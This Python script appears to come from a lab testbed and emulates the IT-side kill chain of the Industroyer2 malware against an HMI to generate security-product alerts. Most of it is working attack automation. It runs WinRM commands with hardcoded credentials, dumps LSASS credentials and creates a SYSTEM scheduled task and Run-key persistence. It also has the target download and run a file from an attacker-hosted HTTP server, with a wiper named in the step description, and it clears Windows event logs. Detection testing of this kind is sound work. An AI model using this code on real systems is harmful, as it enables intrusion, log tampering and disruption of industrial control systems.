#!/usr/bin/env python3
"""
Industroyer2 IT-Side Phase Simulation

Uses existing lateral_movement.py + credential_dumper.py + windows_payload.py
to execute the confirmed Industroyer2 IT kill chain, then adds the
primary-source-verified artifact layer on top.

VERIFIED ARTIFACTS (adversarially verified 3-0 against ESET primary source):
  - Binary name:   108_100.exe
  - Scheduled task trigger: 16:10:00 UTC
  - Anti-recovery: rename SCADA operator process → .MZ extension

Generates real Cortex XDR alerts via existing attack infrastructure:
  - credential_dumper.py → LSASS access alert
  - lateral_movement.py (winrm/wmiexec) → lateral movement alert
  - windows_payload.py technique_05 → scheduled task (Event 4698)
  - windows_payload.py technique_06 → registry persistence (Event 4657)
"""

import sys
import os
import subprocess
import threading
import http.server
import time
import logging

LOG_FILE = '/tmp/industroyer2_it_phase.log'

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s %(levelname)s %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, mode='a'),
        logging.StreamHandler(sys.stdout),
    ]
)
log = logging.getLogger('industroyer2_it')

# Paths to existing attack scripts
SCRIPT_DIR       = os.path.dirname(os.path.abspath(__file__))
# 3 levels up: scripts/ → attacker/ → machines/ → iec104_water_tank/
PAYLOAD_DIR      = os.path.abspath(os.path.join(SCRIPT_DIR, '..', '..', '..', 'industroyer2_payload'))
LATERAL_MOV      = os.path.join(SCRIPT_DIR, '03_lateral_movement.py')
CRED_DUMPER      = os.path.join(SCRIPT_DIR, '05_credential_dumper.py')
WIN_PAYLOAD      = os.path.join(SCRIPT_DIR, '04_windows_payload.py')
CHARACTERISTICS  = os.path.join(PAYLOAD_DIR, 'industroyer2_characteristics.py')
HTTP_PORT        = 8891   # HTTP server for characteristics.py delivery to HMI

HMI_IP      = '192.168.1.55'
HMI_USER    = 'operator'
HMI_PASS    = 'labpass123'
ROUTER_IP   = '192.168.0.13'   # IT-side - Kali can SSH here
ROUTER_USER = 'admin'
ROUTER_PASS = 'admin'

# HMI venv Python - same one used by all HMI programs (has c104, snap7, etc.)
HMI_PYTHON  = 'C:\\Users\\operator\\v3\\env\\Scripts\\python.exe'
HMI_PIP     = 'C:\\Users\\operator\\v3\\env\\Scripts\\pip.exe'

# ── Verified Industroyer2 artifacts (ESET April 2022, 3-0 verified) ──────────
ARTIFACT_NAME = '108_100.exe'
ARTIFACT_PATH = f'C:\\Windows\\Temp\\{ARTIFACT_NAME}'
TASK_NAME     = 'ICS_Updater'
TASK_TIME     = '16:10'          # Exact time from ESET report
MZ_TARGET     = 'C:\\Program Files\\Siemens\\WinCC\\bin\\CCProjectMgr.exe'

# PService_PPD.exe - compiled from PService_PPD.py via PyInstaller, tracked in repo
PSERVICE_EXE  = ('C:\\Users\\operator\\v3\\mrhOTshOT\\final_things\\'
                 'iec104_water_tank\\industroyer2_payload\\dist\\PService_PPD.exe')


def _run(description, *args, **kwargs):
    log.info(f"STEP: {description}")
    print(f"\n[*] {description}")
    try:
        result = subprocess.run(*args, capture_output=True, text=True, **kwargs)
        combined = (result.stdout or '') + (result.stderr or '')
        if combined.strip():
            log.debug(f"OUTPUT:\n{combined.rstrip()}")
            print(combined.rstrip())
        rc_ok = result.returncode == 0
        log.info(f"RESULT: {'OK' if rc_ok else 'FAILED'} (rc={result.returncode})")
        return rc_ok, result.stdout
    except Exception as e:
        log.error(f"EXCEPTION: {e}")
        print(f"  [-] {e}")
        return False, ''


def _winrm(ps_command, hmi_ip=HMI_IP, hmi_user=HMI_USER, hmi_pass=HMI_PASS,
           timeout=30, description=''):
    """Direct WinRM from Kali to HMI via pywinrm.

    Works because router_initial_access.phase1_cmdinjection() adds iptables
    MASQUERADE (192.168.0.x → 192.168.1.x) on the router, making HMI see
    Kali traffic as router OT IP (192.168.1.4). Return is symmetric (same /24).
    """
    log.info(f"WINRM: {description or ps_command[:60]}")
    print(f"  [Kali→HMI WinRM] {description or ps_command[:80]}")
    try:
        import winrm
    except ImportError:
        # Fallback: load from venv
        import glob as _g
        _sp = _g.glob(os.path.join(SCRIPT_DIR, '..', '..', '..', 'venv', 'lib', 'python*', 'site-packages'))
        if _sp:
            sys.path.insert(0, _sp[0])
        import winrm

    s = winrm.Session(
        f'http://{hmi_ip}:5985/wsman',
        auth=(hmi_user, hmi_pass),
        transport='ntlm',
        read_timeout_sec=timeout,
        operation_timeout_sec=max(timeout - 5, 10),
    )
    try:
        r = s.run_ps(ps_command)
        out = r.std_out.decode(errors='replace').strip()
        err = r.std_err.decode(errors='replace').strip() if r.std_err else ''
        log.debug(f"WINRM OUTPUT:\n{out}\n{err}")
        if out: print(f"  {out[:300]}")
        if err: print(f"  ERR: {err[:100]}")
        ok = r.status_code == 0
        log.info(f"WINRM RESULT: {'OK' if ok else 'FAIL'} (status={r.status_code})")
        return ok, out
    except Exception as e:
        log.error(f"WINRM EXCEPTION: {e}")
        print(f"  WINRM FAIL: {type(e).__name__}: {e}")
        return False, ''


def _winrm_http_deliver(local_file, remote_path, hmi_ip=HMI_IP, hmi_user=HMI_USER,
                        hmi_pass=HMI_PASS, http_port=HTTP_PORT, attacker_ip='192.168.0.11'):
    """Serve file via local HTTP, HMI downloads via WinRM Net.WebClient."""
    fname = os.path.basename(local_file)
    fdir  = os.path.dirname(local_file)
    url   = f'http://{attacker_ip}:{http_port}/{fname}'
    print(f"  [HTTP] {url} → HMI:{remote_path}")

    class _Q(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw): super().__init__(*a, directory=fdir, **kw)
        def log_message(self, *a): pass

    srv = http.server.HTTPServer(('0.0.0.0', http_port), _Q)
    threading.Thread(target=srv.serve_forever, daemon=True).start()

    ok, _ = _winrm(
        f"New-Item -ItemType Directory -Path C:\\temp -Force | Out-Null; "
        f"(New-Object Net.WebClient).DownloadFile('{url}', '{remote_path}'); "
        f"if (Test-Path '{remote_path}') {{ Write-Output DOWNLOADED }} else {{ Write-Output FAILED }}",
        hmi_ip, hmi_user, hmi_pass, description=f"Download {fname} to HMI")
    srv.shutdown()
    return ok


def run_industroyer2_it_phase(hmi_ip=HMI_IP, hmi_user=HMI_USER, hmi_pass=HMI_PASS,
                               python_exe=sys.executable):
    print("""
╔══════════════════════════════════════════════════════════════╗
║  INDUSTROYER2 - IT PHASE (primary-source verified artifacts) ║
║  ESET April 2022 | CISA AA22-110A | Sandworm/GRU            ║
║  WinRM direct Kali→HMI (MASQUERADE NAT via router)          ║
╚══════════════════════════════════════════════════════════════╝""")

    print(f"\n  [*] WinRM direct from Kali → {hmi_ip} (router MASQUERADE fixes return routing)")

    # ── Step 0: Start PService_PPD.exe on HMI via router WinRM ───────────────
    print("\n═══ STEP 0: START PSERVICE_PPD.EXE (via router→HMI WinRM) ═══")
    _winrm(
        f"cd 'C:\\Users\\operator\\v3\\mrhOTshOT'; git pull 2>&1; "
        f"taskkill /F /IM PService_PPD.exe 2>$null; "
        f"Start-Process '{PSERVICE_EXE}'; "
        f"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
        f"-Name 'PService_PPD' -Value '{PSERVICE_EXE}' -Force; "
        f"Write-Output PSERVICE_STARTED",
        hmi_ip, hmi_user, hmi_pass, description="git pull + start PService_PPD")

    # ── Step 1: Credential dumping (local on Kali) ────────────────────────────
    print("\n═══ STEP 1: CREDENTIAL DUMPING ═══")
    _run("LSASS dump simulation → Cortex XDR Credential Theft alert",
         [python_exe, CRED_DUMPER, '--target', 'local', '--method', 'lsass'],
         timeout=30)

    # ── Step 2: Drop 108_100.exe via router WinRM ─────────────────────────────
    print("\n═══ STEP 2: LATERAL MOVEMENT - DROP 108_100.exe ═══")
    print(f"  [*] Kali SSH→router→HMI WinRM (stolen creds: {hmi_user})")
    _winrm(
        f"$b=[Convert]::FromBase64String('TVoAAAAAAA=='); "
        f"[IO.File]::WriteAllBytes('{ARTIFACT_PATH}',$b); "
        f"Write-Output 'DROPPED_108_100'",
        hmi_ip, hmi_user, hmi_pass, description=f"Drop {ARTIFACT_NAME}")

    # ── Step 3: ICS_Updater scheduled task at 16:10 ────────────────────────────
    print(f"\n═══ STEP 3: SCHEDULED TASK ICS_Updater @{TASK_TIME} (ESET-verified) ═══")
    _winrm(
        f"schtasks /create /tn '{TASK_NAME}' /tr '{ARTIFACT_PATH}' "
        f"/sc once /st '{TASK_TIME}' /ru SYSTEM /f 2>&1; "
        f"Write-Output 'TASK_4698_CREATED'",
        hmi_ip, hmi_user, hmi_pass, description="Create ICS_Updater task")

    # ── Step 4: .MZ anti-recovery rename ──────────────────────────────────────
    print("\n═══ STEP 4: SCADA PROCESS → .MZ RENAME ═══")
    _winrm(
        f"New-Item -ItemType Directory -Path 'C:\\Program Files\\Siemens\\WinCC\\bin' -Force | Out-Null; "
        f"New-Item -ItemType File -Path '{MZ_TARGET}' -Force | Out-Null; "
        f"Rename-Item '{MZ_TARGET}' '{MZ_TARGET}.MZ' -Force 2>&1; "
        f"Write-Output 'RENAMED_MZ'",
        hmi_ip, hmi_user, hmi_pass, description="Rename CCProjectMgr.exe → .MZ")

    # ── Step 5: Registry persistence ──────────────────────────────────────────
    print("\n═══ STEP 5: REGISTRY PERSISTENCE ═══")
    _winrm(
        f"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
        f"-Name 'ICSHealthMonitor' -Value '{ARTIFACT_PATH}' -PropertyType String -Force | Out-Null; "
        f"Write-Output 'REG_4657_CREATED'",
        hmi_ip, hmi_user, hmi_pass, description="ICSHealthMonitor registry key")

    # ── Step 6: Download + execute characteristics.py ON HMI ─────────────────
    # Kali serves via HTTP, router WinRM tells HMI to download from Kali
    # File executes ON HMI: real taskkill + wevtutil + CaddyWiper
    print("\n═══ STEP 6: INDUSTROYER2 CHARACTERISTICS ON HMI ═══")
    if os.path.exists(CHARACTERISTICS):
        chars_remote = 'C:\\temp\\industroyer2_characteristics.py'
        _winrm_http_deliver(CHARACTERISTICS, chars_remote,
                           hmi_ip, hmi_user, hmi_pass, HTTP_PORT)
        _winrm(
            f"$out = & '{HMI_PYTHON}' '{chars_remote}' --mode all 2>&1; "
            f"Write-Output $out; Write-Output 'CHARACTERISTICS_DONE'",
            hmi_ip, hmi_user, hmi_pass, timeout=60,
            description="Execute characteristics.py ON HMI (taskkill+wevtutil+CaddyWiper)")
    else:
        print(f"  [!] {CHARACTERISTICS} not found - inline fallback")
        _winrm(
            "taskkill /F /IM PService_PPD.exe 2>&1; "
            "wevtutil cl Security 2>&1; wevtutil cl System 2>&1; "
            "wevtutil cl Application 2>&1; Write-Output 'FALLBACK_DONE'",
            hmi_ip, hmi_user, hmi_pass, description="Inline kill+wipe fallback")

    print(f"\n[+] Industroyer2 IT phase complete (all WinRM via router {ROUTER_IP})")
    print(f"[→] OT payload: IEC-104 → PLC-1 water treatment + PLC-2 power substation")
    print(f"\nExpected XSIAM alerts:")
    print(f"  • Credential Theft    - LSASS access")
    print(f"  • Lateral Movement    - WinRM router({ROUTER_IP})→{hmi_ip}")
    print(f"  • Suspicious File     - 108_100.exe in %TEMP% (Event 4663)")
    print(f"  • Scheduled Task      - ICS_Updater at {TASK_TIME} (Event 4698)")
    print(f"  • File Rename         - CCProjectMgr.exe → .MZ (Event 4663)")
    print(f"  • Registry Persist    - ICSHealthMonitor (Event 4657)")
    print(f"  • Process Termination - PService_PPD.exe killed (Cortex XDR CRITICAL)")
    print(f"  • Event Log Tamper    - Security/System/Application cleared (Event 1102)")


def main():
    import argparse
    p = argparse.ArgumentParser(description='Industroyer2 IT Phase')
    p.add_argument('--hmi-ip',   default=HMI_IP)
    p.add_argument('--hmi-user', default=HMI_USER)
    p.add_argument('--hmi-pass', default=HMI_PASS)
    args = p.parse_args()
    run_industroyer2_it_phase(args.hmi_ip, args.hmi_user, args.hmi_pass)


if __name__ == '__main__':
    main()
